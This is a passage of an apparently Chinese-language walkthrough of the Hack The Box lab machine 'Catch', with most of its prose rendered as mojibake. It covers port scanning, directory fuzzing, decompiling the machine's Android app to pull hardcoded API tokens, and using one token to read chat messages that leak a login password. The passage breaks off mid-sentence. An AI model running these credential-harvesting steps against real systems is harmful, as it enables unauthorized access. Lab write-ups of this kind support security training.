NMAP\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.150\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-06 03:34 EDT\nNmap scan report for 10.10.11.150\nHost is up (0.25s latency).\nNot shown: 65530 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Catch Global Systems\n3000/tcp open  ppp?\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/html; charset=UTF-8\n|     Set-Cookie: i_like_gitea=229c01ff2c679664; Path=/; HttpOnly\n|     Set-Cookie: _csrf=VFIu8a5yLSGnb8AWF33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ; Path=/; Expires=Thu, 07 Apr 2022 07:35:24 GMT; HttpOnly; SameSite=Lax\n|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Wed, 06 Apr 2022 07:35:24 GMT\n|     <!DOCTYPE html>\n|     <html lang=\"en-US\" class=\"theme-\">\n|     <head data-suburl=\"\">\n|     <meta charset=\"utf-8\">\n|     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n|     <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n|     <title> Catch Repositories </title>\n|     <link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Set-Cookie: i_like_gitea=ada0631c19902f31; Path=/; HttpOnly\n|     Set-Cookie: _csrf=Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg; Path=/; Expires=Thu, 07 Apr 2022 07:35:33 GMT; HttpOnly; SameSite=Lax\n|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Wed, 06 Apr 2022 07:35:33 GMT\n|_    Content-Length: 0\n5000/tcp open  upnp?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: \n|     HTTP/1.1 400 Bad Request\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 302 Found\n|     X-Frame-Options: SAMEORIGIN\n|     X-Download-Options: noopen\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Content-Security-Policy: \n|     X-Content-Security-Policy: \n|     X-WebKit-CSP: \n|     X-UA-Compatible: IE=Edge,chrome=1\n|     Location: /login\n|     Vary: Accept, Accept-Encoding\n|     Content-Type: text/plain; charset=utf-8\n|     Content-Length: 28\n|     Set-Cookie: connect.sid=s%3AEQngskGgO4I2xPH7SOxj7INNlQZTOA-7.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw; Path=/; HttpOnly\n|     Date: Wed, 06 Apr 2022 07:35:28 GMT\n|     Connection: close\n|     Found. Redirecting to /login\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     X-Frame-Options: SAMEORIGIN\n|     X-Download-Options: noopen\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Content-Security-Policy: \n|     X-Content-Security-Policy: \n|     X-WebKit-CSP: \n|     X-UA-Compatible: IE=Edge,chrome=1\n|     Allow: GET,HEAD\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 8\n|     ETag: W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\n|     Set-Cookie: connect.sid=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy.5H0gXM7aorV%2BeFuutbDUJQn149ThPRcg%2FiKj%2FeVanl0; Path=/; HttpOnly\n|     Vary: Accept-Encoding\n|     Date: Wed, 06 Apr 2022 07:35:31 GMT\n|     Connection: close\n|_    GET,HEAD\n8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Catch Global Systems\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port3000-TCP:V=7.91%I=7%D=4/6%Time=624D42BB%P=x86_64-pc-linux-gnu%r(Gen\nSF:ericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te\nSF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2\nSF:0Request\")%r(GetRequest,14F9,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x\nSF:20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20i_like_gitea=229c01ff2c\nSF:679664;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=VFIu8a5yLSGnb8AW\nSF:F33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ;\\x20Path=/;\\x20Expires=Thu,\\x200\nSF:7\\x20Apr\\x202022\\x2007:35:24\\x20GMT;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSe\nSF:t-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x20HttpOnly\\r\\nX-\nSF:Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x200\nSF:7:35:24\\x20GMT\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20lang=\\\"en-US\\\"\\x20cl\nSF:ass=\\\"theme-\\\">\\n<head\\x20data-suburl=\\\"\\\">\\n\\t<meta\\x20charset=\\\"utf-8\nSF:\\\">\\n\\t<meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20i\nSF:nitial-scale=1\\\">\\n\\t<meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content\nSF:=\\\"ie=edge\\\">\\n\\t<title>\\x20Catch\\x20Repositories\\x20</title>\\n\\t<link\\\nSF:x20rel=\\\"manifest\\\"\\x20href=\\\"data:application/json;base64,eyJuYW1lIjoi\nSF:Q2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyI\nSF:sInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3\nSF:sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz\")%r(Help,67,\"HTTP/1\\.1\\x2040\nSF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\\nSF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,17F,\nSF:\"HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nSet-Cookie:\\x20i_like_\nSF:gitea=ada0631c19902f31;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=\nSF:Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg;\\x20Path=/;\\x20E\nSF:xpires=Thu,\\x2007\\x20Apr\\x202022\\x2007:35:33\\x20GMT;\\x20HttpOnly;\\x20Sa\nSF:meSite=Lax\\r\\nSet-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x\nSF:20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Wed,\\x2006\\x20\nSF:Apr\\x202022\\x2007:35:33\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSP\nSF:Request,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text\nSF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R\nSF:equest\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5000-TCP:V=7.91%I=7%D=4/6%Time=624D42C0%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,23C,\"HTTP/1\\.1\\x20302\\x20Found\\r\\nX-Frame-Options:\\x20SAMEORIGI\nSF:N\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Options:\\x20nosnif\nSF:f\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Security-Policy:\\\nSF:x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20\\r\\nX-UA-Comp\nSF:atible:\\x20IE=Edge,chrome=1\\r\\nLocation:\\x20/login\\r\\nVary:\\x20Accept,\\\nSF:x20Accept-Encoding\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\nSF:Content-Length:\\x2028\\r\\nSet-Cookie:\\x20connect\\.sid=s%3AEQngskGgO4I2xP\nSF:H7SOxj7INNlQZTOA-7\\.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw;\\x20P\nSF:ath=/;\\x20HttpOnly\\r\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x2007:35:28\\x2\nSF:0GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nFound\\.\\x20Redirecting\\x20to\\x20/lo\nSF:gin\")%r(RTSPRequest,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnectio\nSF:n:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReqTCP,2F,\"HTTP/1\\.1\\x20400\\x20Ba\nSF:d\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(SMBProgNeg,2F,\"HTTP/1\\\nSF:.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(ZendJav\nSF:aBridge,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n\")%r(HTTPOptions,247,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Frame-Options:\nSF:\\x20SAMEORIGIN\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Optio\nSF:ns:\\x20nosniff\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Secu\nSF:rity-Policy:\\x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20\nSF:\\r\\nX-UA-Compatible:\\x20IE=Edge,chrome=1\\r\\nAllow:\\x20GET,HEAD\\r\\nConte\nSF:nt-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x208\\r\\nETag\nSF::\\x20W/\\\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\\\"\\r\\nSet-Cookie:\\x20connect\\.sid\nSF:=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy\\.5H0gXM7aorV%2BeFuutbDUJQn149ThPR\nSF:cg%2FiKj%2FeVanl0;\\x20Path=/;\\x20HttpOnly\\r\\nVary:\\x20Accept-Encoding\\r\nSF:\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x2007:35:31\\x20GMT\\r\\nConnection:\\\nSF:x20close\\r\\n\\r\\nGET,HEAD\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Re\nSF:quest\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSStatusRequestTCP,2F,\"HTTP/\nSF:1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(Help,\nSF:2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\"\nSF:);\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/6%OT=22%CT=1%CU=30269%PV=Y%DS=2%DC=T%G=Y%TM=624D4342\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=10\nOS:5%GCD=3%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3\nOS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=F\nOS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW\nOS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF\nOS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=\nOS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=\nOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT       ADDRESS\n1   276.00 ms 10.10.14.1\n2   276.19 ms 10.10.11.150\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 160.41 seconds\n```\n## HTTP\n### 80 ç«¯å£\n![](Hackthebox-Catch/69e43a85-65a9-4113-9afc-9f8940987d18.png)\n\nè®¿é—®åå‘ç°ä»»ä½•é¡µé¢ï¼Œé™¤äº†ä¸‹è½½ apk ä»¥å¤–ï¼Œéƒ½æ— æ³•ç‚¹ã€‚\n\næ¥ç€æˆ‘åšäº†ä¸€ä¸‹ fuzzï¼Œä¹Ÿå¹¶æ²¡æœ‰ä¸œè¥¿ï¼Œå…ˆæŠŠ apk æ–‡ä»¶ä¸‹è½½ä¸‹æ¥å§ï¼ŒåŒæ—¶å»çœ‹çœ‹å…¶ä»–å†…å®¹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.150/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.150/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\njavascript              [Status: 301, Size: 317, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 277, Words: 20, Lines: 10]\n                        [Status: 200, Size: 6163, Words: 855, Lines: 375]\n:: Progress: [20116/20116] :: Job [1/1] :: 112 req/sec :: Duration: [0:02:39] :: Errors: 0 ::\n```\næ²¡æœ‰å†…å®¹\n\n### 5000 ç«¯å£\n![](Hackthebox-Catch/56804c39-c012-4df1-90a7-1bbdaca4477d.png)\n\n5000 ç«¯å£æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä½†æ˜¯ä¼¼ä¹æ²¡æœ‰è´¦å·\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.150:5000/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.150:5000/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nlogout                  [Status: 302, Size: 28, Words: 4, Lines: 1]\nmedia                   [Status: 301, Size: 177, Words: 7, Lines: 11]\nlogin                   [Status: 200, Size: 2622, Words: 709, Lines: 57]\nfiles                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nusers                   [Status: 401, Size: 12, Words: 1, Lines: 1]\naccount                 [Status: 401, Size: 12, Words: 1, Lines: 1]\nLogin                   [Status: 200, Size: 2622, Words: 709, Lines: 57]\nConnections             [Status: 401, Size: 12, Words: 1, Lines: 1]\nconnections             [Status: 401, Size: 12, Words: 1, Lines: 1]\nFiles                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nmessages                [Status: 401, Size: 12, Words: 1, Lines: 1]\nAccount                 [Status: 401, Size: 12, Words: 1, Lines: 1]\nMedia                   [Status: 301, Size: 177, Words: 7, Lines: 11]\nUsers                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nFILES                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nLogout                  [Status: 302, Size: 28, Words: 4, Lines: 1]\nMessages                [Status: 401, Size: 12, Words: 1, Lines: 1]\n                        [Status: 302, Size: 28, Words: 4, Lines: 1]\nrooms                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nMEDIA                   [Status: 301, Size: 177, Words: 7, Lines: 11]\nCONNECTIONS             [Status: 401, Size: 12, Words: 1, Lines: 1]\nLOGIN                   [Status: 200, Size: 2627, Words: 709, Lines: 57]\n:: Progress: [20116/20116] :: Job [1/1] :: 77 req/sec :: Duration: [0:05:20] :: Errors: 0 ::\n```\nä¸œè¥¿è¿˜æŒºå¤šï¼Œå»çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Catch/e7bfff2a-25b5-4df6-b1d5-ec6a13a98e2d.png)\n\næç¤º Unauthorized æ²¡æœ‰ä»¤ç‰Œå˜›ï¼Œæ¯•ç«Ÿæ²¡æœ‰ç™»é™†\n\n### 8000 ç«¯å£\n![](Hackthebox-Catch/bc93a10b-b3a3-4e7e-9352-9c5fd13ed739.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªç³»ç»Ÿè¿è¡Œç›‘æ§çš„ï¼Œç„¶åç‚¹å‡»ä¸‹é¢çš„ä»ªè¡¨ç›˜ä¼šè¿›å…¥ä¸€ä¸ªç™»å½•é¡µé¢\n\n![](Hackthebox-Catch/98515bd6-0376-4759-867d-e96c2584c7b8.png)\n\nè¯•äº†å‡ ä¸ªå¼±å£ä»¤éƒ½æ— æ³•è¿›å»ï¼Œå»çœ‹çœ‹ apk æ–‡ä»¶å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.150:8000/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.150:8000/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nadmin                   [Status: 302, Size: 386, Words: 60, Lines: 12]\nimg                     [Status: 301, Size: 317, Words: 20, Lines: 10]\nfonts                   [Status: 301, Size: 319, Words: 20, Lines: 10]\nsetup                   [Status: 302, Size: 382, Words: 60, Lines: 12]\ndashboard               [Status: 302, Size: 386, Words: 60, Lines: 12]\nstorage                 [Status: 403, Size: 279, Words: 20, Lines: 10]\ndist                    [Status: 301, Size: 318, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 279, Words: 20, Lines: 10]\n                        [Status: 200, Size: 8870, Words: 1951, Lines: 302]\n:: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:05:55] :: Errors: 0 ::\n```\nä¹Ÿæ²¡å•¥å¯çœ‹çš„ä¸œè¥¿\n\n## Apk\nä½¿ç”¨ apktool è¿›è¡Œåç¼–è¯‘\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch]\nâ””â”€# apktool d catchv1.0.apk \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nI: Using Apktool 2.5.0-dirty on catchv1.0.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /root/.local/share/apktool/framework/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n```\nç„¶åæŸ¥æ‰¾ä¸€ä¸‹ token\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch]\nâ””â”€# grep -rn token catchv1.0/res/values/strings.xml\n43:    <string name=\"gitea_token\">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>\n47:    <string name=\"lets_chat_token\">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>\n104:    <string name=\"slack_token\">xoxp-23984754863-2348975623103</string>\n```\nåœ¨ `/catchv1.0/res/values/string.xml` ä¸‹çš„ç¬¬ 47 è¡Œæœ‰ä¸€ä¸ª `lets_chat_token` ï¼Œåº”è¯¥å°±æ˜¯è¿™ä¸ªäº†ï¼Œæ¥åˆ©ç”¨ä¸€ä¸‹å§\n\n# æ¼æ´åˆ©ç”¨\nä½¿ç”¨ä»¤ç‰Œæˆæƒè¿›è¡Œè¯»å–\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl -H 'Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' 'http://10.10.11.150:5000/rooms'\n[{\"id\":\"61b86b28d984e2451036eb17\",\"slug\":\"status\",\"name\":\"Status\",\"description\":\"Cachet Updates and Maintenance\",\"lastActive\":\"2021-12-14T10:34:20.749Z\",\"created\":\"2021-12-14T10:00:08.384Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]},{\"id\":\"61b8708efe190b466d476bfb\",\"slug\":\"android_dev\",\"name\":\"Android Development\",\"description\":\"Android App Updates, Issues & More\",\"lastActive\":\"2021-12-14T10:24:21.145Z\",\"created\":\"2021-12-14T10:23:10.474Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]},{\"id\":\"61b86b3fd984e2451036eb18\",\"slug\":\"employees\",\"name\":\"Employees\",\"description\":\"New Joinees, Org updates\",\"lastActive\":\"2021-12-14T10:18:04.710Z\",\"created\":\"2021-12-14T10:00:31.043Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]}]\n```\nè¯»å–ä¸€ä¸‹ rooms çš„å†…å®¹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl -H 'Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' 'http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages'\n[{\"id\":\"61b8732cfe190b466d476c02\",\"text\":\"ah sure!\",\"posted\":\"2021-12-14T10:34:20.749Z\",\"owner\":\"61b86dbdfe190b466d476bf0\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b8731ffe190b466d476c01\",\"text\":\"You should actually include this task to your list as well as a part of quarterly audit\",\"posted\":\"2021-12-14T10:34:07.449Z\",\"owner\":\"61b86aead984e2451036eb16\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b872b9fe190b466d476c00\",\"text\":\"Also make sure we've our systems, applications and databases up-to-date.\",\"posted\":\"2021-12-14T10:32:25.514Z\",\"owner\":\"61b86dbdfe190b466d476bf0\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b87282fe190b466d476bff\",\"text\":\"Excellent! \",\"posted\":\"2021-12-14T10:31:30.403Z\",\"owner\":\"61b86aead984e2451036eb16\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b87277fe190b466d476bfe\",\"text\":\"Why not. We've this in our todo list for next quarter\",\"posted\":\"2021-12-14T10:31:19.094Z\",\"owner\":\"61b86dbdfe190b466d476bf0\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b87241fe190b466d476bfd\",\"text\":\"@john is it possible to add SSL to our status domain to make sure everything is secure ? \",\"posted\":\"2021-12-14T10:30:25.108Z\",\"owner\":\"61b86aead984e2451036eb16\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b8702dfe190b466d476bfa\",\"text\":\"Here are the credentials `john :  E}V!mywu_69T4C}W`\",\"posted\":\"2021-12-14T10:21:33.859Z\",\"owner\":\"61b86f15fe190b466d476bf5\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b87010fe190b466d476bf9\",\"text\":\"Sure one sec.\",\"posted\":\"2021-12-14T10:21:04.635Z\",\"owner\":\"61b86f15fe190b466d476bf5\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b86fb1fe190b466d476bf8\",\"text\":\"Can you create an account for me ? \",\"posted\":\"2021-12-14T10:19:29.677Z\",\"owner\":\"61b86dbdfe190b466d476bf0\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b86f4dfe190b466d476bf6\",\"text\":\"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. \",\"posted\":\"2021-12-14T10:17:49.761Z\",\"owner\":\"61b86f15fe190b466d476bf5\",\"room\":\"61b86b28d984e2451036eb17\"}]\n```\nç»§ç»­è¯»å–ä¸€ä¸‹æˆ¿é—´å†…çš„æ¶ˆæ¯\n\n```bash\nusername = john\npassword = E}V!mywu_69T4C}W\n```\nè¿™é‡Œä»ä¸Šé¢çš„å†…å®¹ä¸­æå–åˆ°äº†ä¸€ç»„è´¦å·å¯†ç \n\næ‹¿åˆ° 8000 ç«¯å£å»ç™»é™†è¯•è¯•\n\n![](Hackthebox-Catch/805be4eb-bf6f-43a6-81e3-7ed44cdda94c.png)\n\næˆåŠŸç™»é™†ï¼Œåˆ°å¤„çœ‹çœ‹\n\n![](Hackthebox-Catch/9ef80eaa-402e-4a74-8020-501117eb15d7.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ª cachet 